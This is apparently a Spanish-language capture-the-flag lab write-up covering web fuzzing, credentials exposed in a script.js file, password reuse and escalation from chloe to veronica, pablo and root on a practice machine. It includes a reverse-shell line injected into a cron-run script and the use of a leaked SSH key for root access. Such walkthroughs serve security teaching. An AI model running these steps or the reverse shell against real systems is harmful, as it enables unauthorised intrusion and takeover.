## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de login que por alguna medida de sseguridad no deja interceptar la petición, asi que fuzzeo la página:

```bash
gobuster dir --url http://<IP>/ -w <WORDLIST> -x html,php,txt,bak,zip,backup -t 100 -k
```

Encuentro la ruta /archiv con un script.js :

```bash
http://172.17.0.2/archiv/script.js
```

Dentro hay unas credenciales de varios posibles usuarios (admin, chloe) expuestas para el panel:

User = admin 

Pass =  CyberSecure123

Dentro hay un dashboard pero no se puede hacer nada.

La de chloe es valida para ssh (chloe123)

```bash
ssh chloe@172.17.0.2 
```

## Escalada chloe → veronica

Listando “home” se ve que la carpeta del usuario veronica tiene todos los permisos.

```bash
cat .bash_history
dmVyb25pY2ExMjMK
```

Es una linea codificada en base64, pero la pura linea es la contraseña en si.

## Escalada veronica → pablo

```bash
ps aux
```

Listando los procesos encuentro que se está ejecutando Crontab

Para un mejor análisis utilizo la herramienta Pspy64 que ya tengo en mi máquina:

```bash
scp pspy64 chloe@172.17.0.2:/tmp
```

Encuentro que en la carpeta /home/veronica/.local hay un script del usuario pablo con permisos de edición del grupo taller, convenientemente veronica se encuentra en el grupo. 

Editandolo intento mandar una rev shell:

```bash
----<RESTO DE CODIGO>-----
sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Y nos ponemos en escucha.

## Escalada pablo → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
```

Pero si vamos a la carpeta /tmp existe un archivo de pablo llamado id_rsa, intento probar si es la clave PEM del usuario root. 

En la máquina host:

```bash
nano id_rsa
<CLAVE_ID_RSA>
```

Le damos permisos:

```bash
chmod 600 id_rsa
```

Entramos:

```bash
ssh -i id_rsa root@172.17.0.2
```

Y listo.
